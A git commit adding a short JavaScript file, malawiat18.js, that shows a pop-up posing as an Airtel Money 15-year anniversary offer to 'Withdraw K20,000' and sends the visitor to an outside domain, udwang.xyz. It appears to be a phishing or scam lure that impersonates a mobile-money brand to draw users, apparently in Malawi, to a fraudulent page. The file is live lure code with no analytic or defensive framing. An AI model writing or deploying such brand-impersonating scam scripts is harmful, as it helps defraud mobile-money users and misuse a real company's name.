4e0154d90109541a79d6571ae51b626eab0e3d9d
bigetijazz32 <bigetijazz32@gmail.com>
2025-08-06 03:02:08 +0100

    Create malawiat18.js

---
+++ malawiat18.js
@@ -0,0 +1,6 @@
+
+var password = 'Withdraw K20,000'
+password=prompt('Airtel Money: welcome to airtel money 15years anniversary celebration, press OK to get this offer','Withdraw K20,000');
+if (password != 'Withdraw K20,000') {
+location.href='https://www.udwang.xyz/withdraw-R20000-airtelmoney';
+}
